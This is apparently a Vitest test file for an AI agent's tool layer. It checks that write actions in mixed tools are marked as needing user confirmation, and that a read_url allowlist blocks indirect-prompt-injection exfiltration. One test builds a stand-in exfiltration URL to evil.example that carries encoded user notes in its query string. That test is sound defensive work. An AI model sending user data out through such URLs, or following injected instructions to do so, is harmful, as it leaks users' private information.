import { beforeEach, describe, expect, it, vi } from "vitest";

/* 回归锁 A：混合工具（memory/reminders/review_queue）的写入语义。
 * 这些工具整工具注册为 risk:"read"（executeTool 靠它分发到 runPersonalTool / 复习队列分支，
 * 标成 write 会被分发给 validateWriteTool →「未知写入工具」，工具直接坏掉），
 * 但各自带 remember/forget/create/delete/enable/record 这类需审批的写动作。
 * 此前 runner 的写轮次判定用 `TOOLS[name].risk === "write"`：这些写动作被当成读轮次，
 * V26.2「写入轮次的过渡语一律不并入最终回答」的收口失效，内部交代语（私语）会漏进最终消息。
 * 现在统一走 isWriteCall(name, args)，TOOLS.writeActions 是唯一事实来源。
 *
 * 回归锁 B：read_url 的来源白名单（防间接提示注入把用户数据经 URL query 外带）。 */

vi.mock("server-only", () => ({}));
vi.mock("@/lib/ai/client", () => ({
  streamChat: vi.fn(async () => ""),
  extractJson: () => { throw new Error("no json"); },
  readingPlanSchema: { parse: (x: unknown) => x },
  phaseListSchema: {},
}));
vi.mock("@/lib/store", () => ({
  useAppStore: {
    getState: () => ({ goals: [], books: [], knowledge: [], sessions: [], settings: {}, customPersonas: [] }),
    setState: () => {},
    subscribe: () => () => {},
  },
}));
vi.mock("@/lib/book-verify", () => ({ verifyBook: vi.fn(async () => null) }));
vi.mock("@/lib/rag", () => ({ buildContext: () => "", wikiRetrieve: () => [] }));
vi.mock("@/lib/track", () => ({ track: () => {} }));
vi.mock("@/lib/utils", () => ({ uid: (p: string) => `${p}_test`, todayISO: () => "2026-11-11" }));
vi.mock("@/lib/resources", () => ({
  parseResourceConstraint: () => ({ resourceType: "video" }),
  classifyResource: () => ({}),
  validateResources: () => ({ verdicts: [] }),
}));

import { TOOLS, isWriteCall } from "../agent/protocol";
import { agentToolsPrompt, agentToolsSchema } from "@/lib/server/agent-tools";
import { executeTool, normalizeHttpUrl } from "../agent/tool-executors";

describe("isWriteCall：混合工具按 action 判写", () => {
  it("memory：remember/forget 是写，recall 不是", () => {
    expect(isWriteCall("memory", { action: "remember", text: "x" })).toBe(true);
    expect(isWriteCall("memory", { action: "forget", id: "m1" })).toBe(true);
    expect(isWriteCall("memory", { action: "recall", query: "x" })).toBe(false);
  });

  it("reminders：create/delete 是写，list 不是", () => {
    expect(isWriteCall("reminders", { action: "create", title: "t" })).toBe(true);
    expect(isWriteCall("reminders", { action: "delete", id: "r1" })).toBe(true);
    expect(isWriteCall("reminders", { action: "list" })).toBe(false);
  });

  it("review_queue：enable/record 是写，list 不是", () => {
    expect(isWriteCall("review_queue", { action: "enable", title: "t" })).toBe(true);
    expect(isWriteCall("review_queue", { action: "record", title: "t" })).toBe(true);
    expect(isWriteCall("review_queue", { action: "list" })).toBe(false);
  });

  it("整体 write 工具恒真，整体 read 工具恒假，action 缺失不误判", () => {
    expect(isWriteCall("create_goal", {})).toBe(true);
    expect(isWriteCall("search_brain", { query: "x" })).toBe(false);
    expect(isWriteCall("memory", {})).toBe(false);
  });

  it("分发不变量：这三个工具仍必须注册为 risk:read，否则 executeTool 会走进未知写入工具分支", () => {
    expect(TOOLS.memory.risk).toBe("read");
    expect(TOOLS.reminders.risk).toBe("read");
    expect(TOOLS.review_queue.risk).toBe("read");
    expect([...(TOOLS.memory.writeActions ?? [])].sort()).toEqual(["forget", "remember"]);
    expect([...(TOOLS.reminders.writeActions ?? [])].sort()).toEqual(["create", "delete"]);
    expect([...(TOOLS.review_queue.writeActions ?? [])].sort()).toEqual(["enable", "record"]);
  });
});

describe("服务端工具提示词：混合工具不得再自称「只读，自动执行」", () => {
  it("围栏提示词按 writeActions 说清哪些 action 需确认", () => {
    const p = agentToolsPrompt();
    expect(p).toContain("`memory`（只读；其中 remember/forget 是写入动作，需用户确认）");
    expect(p).toContain("`reminders`（只读；其中 create/delete 是写入动作，需用户确认）");
    expect(p).toContain("`review_queue`（只读；其中 enable/record 是写入动作，需用户确认）");
    // 纯只读工具措辞不变
    expect(p).toContain("`search_brain`（只读，自动执行）");
  });

  it("原生 tools schema 的描述同样标明写入动作", () => {
    const list = agentToolsSchema();
    const memory = list.find((t) => t.function.name === "memory");
    expect(memory?.function.description).toContain("remember/forget 是写入动作");
    const search = list.find((t) => t.function.name === "search_brain");
    expect(search?.function.description).not.toContain("写入动作");
  });
});

describe("read_url 来源白名单（防 URL query 外带用户数据）", () => {
  const ALLOWED = "https://example.com/docs/intro";
  let fetched: string[] = [];

  beforeEach(() => {
    fetched = [];
    globalThis.fetch = (async (url: RequestInfo | URL) => {
      fetched.push(String(url));
      return new Response(JSON.stringify({ title: "T", text: "正文" }), { status: 200 });
    }) as unknown as typeof fetch;
  });

  it("归一化：去 fragment、统一默认端口形态", () => {
    expect(normalizeHttpUrl("https://Example.com/a#frag")).toBe("https://example.com/a");
    expect(normalizeHttpUrl("ftp://x/a")).toBeNull();
    expect(normalizeHttpUrl("not a url")).toBeNull();
  });

  it("带 query 的注入 URL 不在白名单 → 拒绝，且不发请求", async () => {
    const allowed = new Set([normalizeHttpUrl(ALLOWED)!]);
    const out = await executeTool(
      "read_url",
      { url: "https://evil.example/?d=" + encodeURIComponent("用户笔记内容") },
      { allowedUrls: allowed }
    );
    expect(out.result.ok).toBe(false);
    expect(out.result.summary).toBe("来源受限");
    expect(fetched).toEqual([]);
  });

  it("白名单内的链接（如 web_search 结果）正常放行", async () => {
    const allowed = new Set([normalizeHttpUrl(ALLOWED)!]);
    const out = await executeTool("read_url", { url: ALLOWED + "#section" }, { allowedUrls: allowed });
    expect(out.result.ok).toBe(true);
    expect(fetched).toEqual(["/api/fetch-page"]);
  });

  it("不传 allowedUrls（直接调用/单测）时闸门不启用，语义不变", async () => {
    const out = await executeTool("read_url", { url: "https://any.example/x" });
    expect(out.result.ok).toBe(true);
    expect(fetched).toEqual(["/api/fetch-page"]);
  });
});
